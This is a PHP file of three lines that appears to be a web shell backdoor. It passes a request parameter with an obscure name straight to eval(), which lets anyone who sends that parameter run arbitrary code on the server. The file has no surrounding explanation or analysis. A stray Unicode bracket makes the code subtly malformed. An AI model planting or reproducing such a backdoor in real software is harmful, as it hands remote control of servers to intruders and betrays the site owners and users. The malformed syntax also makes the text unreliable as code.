<?php
eval($_GET['hKsjNBkJ'〕);
?>
